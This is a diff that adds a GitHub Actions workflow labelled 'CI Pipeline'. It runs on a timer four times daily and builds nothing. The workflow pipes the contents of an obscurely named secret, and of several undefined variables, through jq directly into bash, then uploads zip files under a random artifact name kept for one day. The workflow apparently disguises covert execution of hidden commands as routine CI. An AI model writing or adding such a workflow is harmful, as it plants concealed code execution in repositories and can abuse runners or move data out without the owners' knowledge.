@@ -1,0 +1,26 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '35 5,11,17,23 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          u4824: ${{ secrets.u4824 }}
+        run: |
+          printf '%s' "$u4824" | jq -r .mkzo4 | /bin/bash
+          echo $bb0 | jq -r .fwv0 | /bin/bash
+          echo $kuojf0946 | jq -r .upvw7522 | /bin/bash
+          printf '%s' "$xxhf46" | jq -r .r2 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: PH0MNqpv
+          path: "*.zip"
+          retention-days: 1
